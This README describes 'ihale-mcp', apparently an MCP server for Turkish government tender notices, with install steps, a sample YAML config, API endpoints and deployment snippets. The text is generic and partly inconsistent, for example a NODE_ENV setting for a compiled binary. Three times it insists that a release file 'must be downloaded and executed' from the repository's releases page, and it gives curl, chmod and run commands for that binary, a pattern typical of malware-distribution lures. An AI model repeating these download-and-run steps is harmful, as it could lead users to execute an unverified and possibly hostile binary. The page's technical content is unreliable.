# ihale-mcp — MCP Server for Turkish Government Tender Portal

[![Releases](https://img.shields.io/badge/Release-download-brightgreen)](https://github.com/lolomomabaho/ihale-mcp/releases)

MCP Server for Turkish government tenders (ihale). A backend service that ingests tender notices, validates metadata, publishes feeds, and exposes APIs for integrations. Use the releases page to get the latest executable. The release file must be downloaded and executed from the releases page below.

https://github.com/lolomomabaho/ihale-mcp/releases

Table of contents
- Features
- Quick start
- Installation (Linux, macOS, Windows)
- Configuration
- CLI and API
- Architecture & data model
- Deployment (systemd, Docker)
- Logging & monitoring
- Backup & migration
- Contributing
- License

Features ✨
- Tender ingestion: accept ihale announcements in JSON, XML, or UBL formats.
- Validation: schema checks, business-rule validation, and duplicate detection.
- Publishing: produce feeds (RSS, Atom, JSON) and push notifications.
- API: REST endpoints for search, detail, and subscription management.
- ACL & audit: role-based access and event audit trail.
- Extensions: webhook connectors, SFTP import, and custom parsers.

Images
- Turkish flag:  
  ![Turkey Flag](https://upload.wikimedia.org/wikipedia/commons/b/b4/Flag_of_Turkey.svg =180x120)
- Server icon:  
  ![Server](https://upload.wikimedia.org/wikipedia/commons/3/33/Server_Room.jpg =420x200)

Quick start — download and run 🚀
1. Visit the Releases page and download the latest release package or installer. The release file must be downloaded and executed from the releases page above.
2. Unpack and run the binary or installer you downloaded.

Example (Linux tarball):
```bash
# download (replace with actual asset name shown on the releases page)
curl -L -o ihale-mcp.tar.gz "https://github.com/lolomomabaho/ihale-mcp/releases/download/v1.0.0/ihale-mcp-linux-amd64.tar.gz"
tar xzf ihale-mcp.tar.gz
chmod +x ihale-mcp
./ihale-mcp --config config/ihale.yml
```

Windows (example):
- Download the .zip or .exe from the releases page.
- Extract or run the installer.
- Run from PowerShell:
```powershell
.\ihale-mcp.exe --config .\config\ihale.yml
```

If the release link does not work for you, check the Releases section on the repository page.

Installation details

Linux (Debian/Ubuntu)
- Use the tarball or .deb from releases.
- For tarball:
  - Place binary in /usr/local/bin
  - Create a config at /etc/ihale-mcp/ihale.yml
- Example:
```bash
sudo mv ihale-mcp /usr/local/bin/ihale-mcp
sudo mkdir -p /etc/ihale-mcp
sudo cp config/ihale.yml /etc/ihale-mcp/ihale.yml
```

macOS (Homebrew style manual)
- Use tarball or prebuilt binary.
- Place binary in /usr/local/bin.
- Start from terminal:
```bash
./ihale-mcp --config /usr/local/etc/ihale-mcp/ihale.yml
```

Windows
- Use the provided installer or .zip.
- Place service files under C:\Program Files\ihale-mcp.
- Use NSSM or Windows Service wrapper to run as a service.

Configuration — sample config (YAML)
- The config uses clear keys. The server loads endpoints, DB, and plugins from this file.

```yaml
server:
  host: 0.0.0.0
  port: 8080
  tls: false

database:
  driver: postgres
  dsn: "postgres://ihale:secret@localhost:5432/ihale_db?sslmode=disable"

ingest:
  sources:
    - type: webhook
      path: /ingest/webhook
    - type: sftp
      host: sftp.example.gov
      path: /incoming/ihale

validation:
  schemas:
    - ihale-v1.json
    - ihale-ubl.xsd
  dedupe_window_minutes: 60

publishing:
  rss:
    enabled: true
    max_items: 100
  webhooks:
    - url: https://partner.example/api/notify
      auth_header: "Bearer YOUR_TOKEN"

auth:
  provider: local
  admin_users:
    - admin@example.gov
```

CLI & API — basic commands and endpoints
- CLI
  - ./ihale-mcp serve -- start the server
  - ./ihale-mcp migrate -- run DB migrations
  - ./ihale-mcp ingest -- run manual ingest for a source
- REST API (default port 8080)
  - GET /api/v1/tenders — list tenders
  - GET /api/v1/tenders/{id} — tender details
  - POST /api/v1/subscribe — create subscription (webhook/email)
  - POST /ingest/webhook — incoming tender payloads

Example API calls
```bash
# list tenders
curl "http://localhost:8080/api/v1/tenders?q=kamu"

# get tender by id
curl "http://localhost:8080/api/v1/tenders/2025-TR-0001"
```

Data model (core entities)
- Tender
  - id: string (namespace-year-seq)
  - title: string
  - description: text
  - pub_date: timestamp
  - status: enum (published, amended, cancelled)
  - attachments: list (url, mime)
- Party
  - id, name, role (owner, bidder)
- Event
  - id, type (ingest, validate, publish), timestamp, actor

Architecture — high level 🏛️
- Ingest layer: accepts webhooks, SFTP drops, and scheduled imports.
- Validation layer: checks schema and business rules.
- Processing: transforms to canonical tender model and persists to DB.
- Publishing: creates feeds and sends notifications.
- Admin UI (optional): manage sources, review validation failures.

Suggested diagram (replace with local diagram in repo)
![Architecture](https://upload.wikimedia.org/wikipedia/commons/8/84/Diagram-example.png =640x240)

Deployment examples

Docker
- A Docker image may ship in releases. Pull and run:
```bash
docker run -d --name ihale-mcp \
  -p 8080:8080 \
  -v /srv/ihale-mcp/config:/app/config \
  -e DATABASE_URL="postgres://..." \
  ghcr.io/your-org/ihale-mcp:latest
```

systemd unit (Linux)
- Create /etc/systemd/system/ihale-mcp.service:
```ini
[Unit]
Description=ihale-mcp service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/ihale-mcp --config /etc/ihale-mcp/ihale.yml
Restart=on-failure
User=ihale
Group=ihale
Environment=NODE_ENV=production

[Install]
WantedBy=multi-user.target
```
- Then enable and start:
```bash
sudo systemctl daemon-reload
sudo systemctl enable --now ihale-mcp
```

Scaling
- Run multiple instances behind a load balancer.
- Use a message queue (RabbitMQ, Kafka) for heavy ingest loads.
- Offload static feeds to a CDN.

Logging & monitoring
- The server logs JSON lines by default.
- Integrate with Prometheus via /metrics endpoint.
- Collect logs with a centralized tool (Fluentd, Logstash).
- Check health at /healthz and readiness at /readyz.

Security
- Use TLS for public endpoints.
- Store secrets in a secrets manager or environment variables.
- Use RBAC for admin UI and API keys for integrators.

Backup & migration
- Back up PostgreSQL with pg_dump on a schedule.
- Keep attachments in a versioned object store (S3).
- Test restore procedures on a staging system.

Common tasks

Run migrations
```bash
./ihale-mcp migrate --database "$DATABASE_URL"
```

Reprocess a tender
```bash
./ihale-mcp ingest --file /tmp/tender-2025-TR-0001.json --force
```

Search index rebuild
```bash
./ihale-mcp index rebuild
```

Integrations & extensions
- Webhooks: deliver JSON to subscribers.
- SFTP: poll government SFTP drops.
- Email: deliver digest emails to subscribers.
- Publisher adapters: export to government feeds or partner portals.

Contributing 🤝
- Fork the repo.
- Create a feature branch.
- Write tests for new features.
- Open a pull request with a clear description.
- Use clear commit messages.

Releases and downloads
- Use the Releases page to get binary packages, installers, or Docker images. The release file must be downloaded and executed from the releases page. Visit the Releases page here:
https://github.com/lolomomabaho/ihale-mcp/releases

License
- MIT License. See LICENSE file in the repository.

Contacts & support
- Open an issue on GitHub for bug reports or feature requests.
- Use PRs for code contributions.